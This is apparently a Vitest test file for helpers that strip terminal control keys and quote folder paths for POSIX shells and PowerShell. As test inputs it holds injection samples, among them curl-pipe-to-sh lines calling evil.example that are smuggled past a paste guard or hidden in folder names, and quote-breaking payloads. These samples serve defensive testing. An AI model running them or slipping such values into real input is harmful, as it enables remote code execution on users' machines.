import { describe, expect, it } from "vitest";
import { typedCd, typedQuote, withoutKeys } from "./format";

describe("withoutKeys", () => {
  it("drops what would end the paste guard, wipe the line or press Enter", () => {
    // What a server can put on the clipboard with OSC 52.
    expect(withoutKeys("true\x1b[201~\x15curl -fsSL https://evil.example/p|sh\r")).toBe("true[201~curl -fsSL https://evil.example/p|sh\n");
    expect(withoutKeys("a\x03b\x7fc\x9bd")).toBe("abcd");
  });
  it("keeps tabs, line breaks and ordinary text", () => {
    expect(withoutKeys("one\ttwo\r\nthree\nfour — ✓")).toBe("one\ttwo\nthree\nfour — ✓");
  });
});

describe("typedCd", () => {
  it("goes into a folder, then runs the next command if that worked", () => {
    expect(typedCd("/srv/app", "posix", "clear")).toBe("cd -- '/srv/app' && clear");
    expect(typedCd("/srv/app", "posix")).toBe("cd -- '/srv/app'");
  });
  it("speaks Windows PowerShell 5.1, which has no &&", () => {
    expect(typedCd("C:\\Users\\me\\[old]", "powershell", "claude")).toBe("Set-Location -LiteralPath 'C:\\Users\\me\\[old]'; if ($?) { claude }");
    expect(typedCd("C:\\x", "powershell")).toBe("Set-Location -LiteralPath 'C:\\x'");
  });
  it("types nothing for a folder whose name holds keys", () => {
    expect(typedCd("/tmp/a\x15b", "posix", "clear")).toBeNull();
  });
});

describe("typedQuote", () => {
  it("quotes a folder for a cd typed into a terminal", () => {
    expect(typedQuote("/srv/it's here", "posix")).toBe(`'/srv/it'\\''s here'`);
    expect(typedQuote("/home/me/Документы", "posix")).toBe("'/home/me/Документы'");
    expect(typedQuote("", "posix")).toBe("''");
  });
  it("keeps quotes and backslashes outside the quotes, where fish reads them as sh does", () => {
    // Inside '…' fish takes \' as a quote, which would end the string early.
    expect(typedQuote(`/tmp/a\\'; evil #`, "posix")).toBe(`'/tmp/a'\\\\\\''; evil #'`);
    expect(typedQuote("\\", "posix")).toBe("\\\\");
  });
  it("doubles every quote PowerShell knows", () => {
    expect(typedQuote("C:\\Users\\me\\it's", "powershell")).toBe("'C:\\Users\\me\\it''s'");
    expect(typedQuote("C:\\x’; calc; ’", "powershell")).toBe("'C:\\x’’; calc; ’’'");
  });
  it("refuses names a terminal would take as keys", () => {
    // Ctrl+U wipes the half-typed cd, the rest runs at Enter.
    expect(typedQuote("/tmp/backups\x15curl -s evil.example|sh\r", "posix")).toBeNull();
    for (const key of ["\r", "\n", "\t", "\x03", "\x1b[201~", "\x7f", "\x9b"]) {
      expect(typedQuote(`/tmp/a${key}b`, "posix")).toBeNull();
      expect(typedQuote(`C:\\a${key}b`, "powershell")).toBeNull();
    }
  });
});
